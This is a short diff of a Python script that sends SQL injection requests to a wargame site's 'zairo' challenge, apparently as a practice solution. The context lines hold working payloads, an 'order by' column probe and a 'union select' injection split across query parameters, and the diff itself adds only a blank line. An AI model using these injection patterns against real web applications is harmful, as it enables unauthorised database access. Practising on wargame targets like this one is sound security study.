@@ -14,6 +14,7 @@ for i in range(1,10):
 url='http://wargame.kr:8080/zairo?pw=&flag=abs&id=\' or 1 order by 5 %23'
 response=get(url=url)
 print(response.text)
+
 url='http://wargame.kr:8080/zairo?pw=,3,4,5 %23&flag=abs&id=\' union select 1,'
 response=get(url=url)
 print(response.text)
